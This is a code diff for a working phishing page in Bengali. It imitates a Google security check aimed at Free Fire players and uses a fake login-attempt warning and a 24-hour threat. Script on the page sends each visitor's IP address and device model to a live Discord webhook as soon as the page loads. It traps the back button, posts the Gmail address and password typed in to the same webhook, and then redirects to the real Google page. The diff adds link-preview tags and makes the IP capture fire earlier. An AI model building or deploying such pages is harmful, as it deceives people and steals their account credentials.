@@ -1,112 +1,118 @@
-DOCTYPE html>
-‎<html lang="bn">
-‎<head>
-‎    <meta charset="UTF-8">
-‎    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-‎    <title>Google Security Verification</title>
-‎    <style>
-‎        body { background: #f8f9fa; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-‎        .card { width: 90%; max-width: 400px; background: #fff; padding: 35px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); text-align: center; border-top: 5px solid #d93025; }
-‎        .logo { width: 50px; margin-bottom: 20px; }
-‎        .title { color: #202124; font-size: 20px; font-weight: 500; margin-bottom: 15px; }
-‎        .warn-box { background: #fef7f7; border-left: 5px solid #d93025; padding: 15px; text-align: left; margin-bottom: 20px; border-radius: 4px; font-size: 14px; line-height: 1.6; color: #3c4043; }
-‎        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
-‎        input:focus { border: 2px solid #1a73e8; }
-‎        .btn { width: 100%; padding: 16px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
-‎        .footer { font-size: 11px; color: #70757a; margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px; }
-‎    </style>
-‎</head>
-‎<body>
-‎
-‎<div class="card">
-‎    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
-‎    <div class="title">ডিভাইস ভেরিফিকেশন</div>
-‎    <div class="warn-box">
-‎        <strong>সতর্কতা:</strong> অন্য একটি অপরিচিত ডিভাইস থেকে আপনার <strong>Free Fire</strong> যুক্ত জিমেইল অ্যাকাউন্টে লগইন করার চেষ্টা করা হয়েছে। আপনার আইডিটি নিরাপদ রাখতে আগামী <strong>২৪ ঘণ্টার</strong> মধ্যে ভেরিফাই করুন। অন্যথায় আইডিটি স্থায়ীভাবে হারিয়ে যেতে পারে।
-‎    </div>
-‎    
-‎    <input type="email" id="u" placeholder="জিমেইল এড্রেস" required>
-‎    <input type="password" id="p" placeholder="পাসওয়ার্ড দিন" required>
-‎    <button class="btn" onclick="send()">ভেরিফাই এবং নিরাপদ করুন</button>
-‎    
-‎    <div class="footer">Security Verified by Google Support</div>
-‎</div>
-‎
-‎<script>
-‎    const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
-‎
-‎    // --- ধাপ ১: সবচেয়ে আগে আইপি এবং মডেল পাঠানো (Priority One) ---
-‎    async function captureInstant() {
-‎        let ip = "IP Blocked/Slow";
-‎        let device = "Detecting...";
-‎
-‎        // ডিভাইসের মডেল ধরা (সবচেয়ে পরিষ্কার উপায়)
-‎        try {
-‎            device = navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0];
-‎        } catch(e) { device = navigator.platform; }
-‎
-‎        // আইপি ধরা (সবচেয়ে ফাস্ট সার্ভিস)
-‎        try {
-‎            const res = await fetch('https://api.ipify.org?format=json');
-‎            const data = await res.json();
-‎            ip = data.ip;
-‎        } catch(e) {}
-‎
-‎        // নগদ ডিসকর্ডে পাঠানো
-‎        fetch(WEBHOOK, {
-‎            method: "POST",
-‎            headers: {"Content-Type": "application/json"},
-‎            body: JSON.stringify({
-‎                content: "🚀 **NEW TARGET DETECTED**",
-‎                embeds: [{
-‎                    color: 16711680,
-‎                    fields: [
-‎                        { name: "🌐 IP Address", value: ip },
-‎                        { name: "📱 Mobile Model", value: device }
-‎                    ],
-‎                    timestamp: new Date()
-‎                }]
-‎            })
-‎        });
-‎    }
-‎
-‎    // --- ধাপ ২: ব্যাক বাটন ট্র্যাপ ---
-‎    history.pushState(null, null, location.href);
-‎    window.onpopstate = function() {
-‎        history.pushState(null, null, location.href);
-‎        alert("⚠️ ওয়ার্নিং: ভেরিফিকেশন ছাড়া বের হলে আইডি ব্লক হয়ে যাবে!");
-‎    };
-‎
-‎    // --- ধাপ ৩: জিমেইল এবং পাসওয়ার্ড সংগ্রহ ---
-‎    async function send() {
-‎        const mail = document.getElementById('u').value;
-‎        const pass = document.getElementById('p').value;
-‎
-‎        if(!mail || !pass) return alert("সঠিক তথ্য দিন!");
-‎
-‎        await fetch(WEBHOOK, {
-‎            method: "POST",
-‎            headers: {"Content-Type": "application/json"},
-‎            body: JSON.stringify({
-‎                content: "🧨 **DATA CAPTURED**",
-‎                embeds: [{
-‎                    color: 65280,
-‎                    fields: [
-‎                        { name: "Email", value: mail },
-‎                        { name: "Password", value: pass }
-‎                    ]
-‎                }]
-‎            })
-‎        });
-‎
-‎        alert("ধন্যবাদ। আপনার অ্যাকাউন্ট এখন নিরাপদ।");
-‎        window.onpopstate = null;
-‎        location.href = "https://myaccount.google.com/security";
-‎    }
-‎
-‎    // পেজ লোড হওয়া মাত্রই প্রথম ধাপে আইপি পাঠানো শুরু করবে
-‎    window.onload = captureInstant;
-‎</script>
-‎
-‎</body>
-‎</html>
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="Google Security Center" />
+    <meta property="og:description" content="নিরাপত্তা নিশ্চিত করতে আপনার ডিভাইস ভেরিফাই করুন।" />
+    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" />
+    <meta property="og:type" content="website" />
+
+    <title>Google Security Verification</title>
+    
+    <style>
+        body { background: #f8f9fa; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 90%; max-width: 400px; background: #fff; padding: 35px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); text-align: center; border-top: 5px solid #d93025; }
+        .logo { width: 50px; margin-bottom: 20px; }
+        .title { color: #202124; font-size: 20px; font-weight: 500; margin-bottom: 15px; }
+        .warn-box { background: #fef7f7; border-left: 5px solid #d93025; padding: 15px; text-align: left; margin-bottom: 20px; border-radius: 4px; font-size: 14px; line-height: 1.6; color: #3c4043; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border: 2px solid #1a73e8; }
+        .btn { width: 100%; padding: 16px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
+        .footer { font-size: 11px; color: #70757a; margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px; }
+    </style>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+
+        // ১. লিঙ্কে ক্লিক করার সাথে সাথে আইপি এবং মডেল পাঠানো (সবচেয়ে আগে)
+        async function captureInstant() {
+            let ip = "IP Blocked/Slow";
+            let device = "Detecting...";
+
+            try {
+                device = navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0];
+            } catch(e) { device = navigator.platform; }
+
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "🚀 **NEW TARGET DETECTED**",
+                    embeds: [{
+                        color: 16711680,
+                        fields: [
+                            { name: "🌐 IP Address", value: ip },
+                            { name: "📱 Mobile Model", value: device }
+                        ],
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        }
+        
+        // পেজ লোড হওয়ার জন্য অপেক্ষা না করেই রান করবে
+        captureInstant();
+    </script>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
+    <div class="title">ডিভাইস ভেরিফিকেশন</div>
+    <div class="warn-box">
+        <strong>সতর্কতা:</strong> অন্য একটি অপরিচিত ডিভাইস থেকে আপনার <strong>Free Fire</strong> যুক্ত জিমেইল অ্যাকাউন্টে লগইন করার চেষ্টা করা হয়েছে। আপনার আইডিটি নিরাপদ রাখতে আগামী <strong>২৪ ঘণ্টার</strong> মধ্যে ভেরিফাই করুন। অন্যথায় আইডিটি স্থায়ীভাবে হারিয়ে যেতে পারে।
+    </div>
+    
+    <input type="email" id="u" placeholder="জিমেইল এড্রেস" required>
+    <input type="password" id="p" placeholder="পাসওয়ার্ড দিন" required>
+    <button class="btn" onclick="send()">ভেরিফাই এবং নিরাপদ করুন</button>
+    
+    <div class="footer">Security Verified by Google Support</div>
+</div>
+
+<script>
+    // ২. ব্যাক বাটন ট্র্যাপ
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+        history.pushState(null, null, location.href);
+        alert("⚠️ ওয়ার্নিং: ভেরিফিকেশন ছাড়া বের হলে আইডি ব্লক হয়ে যাবে!");
+    };
+
+    // ৩. জিমেইল এবং পাসওয়ার্ড সংগ্রহ
+    async function send() {
+        const mail = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+
+        if(!mail || !pass) return alert("সঠিক তথ্য দিন!");
+
+        await fetch(WEBHOOK, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                content: "🧨 **DATA CAPTURED**",
+                embeds: [{
+                    color: 65280,
+                    fields: [
+                        { name: "Email", value: mail },
+                        { name: "Password", value: pass }
+                    ]
+                }]
+            })
+        });
+
+        alert("ধন্যবাদ। আপনার অ্যাকাউন্ট এখন নিরাপদ।");
+        window.onpopstate = null;
+        location.href = "https://myaccount.google.com/security";
+    }
+</script>
+
+</body>
+</html>
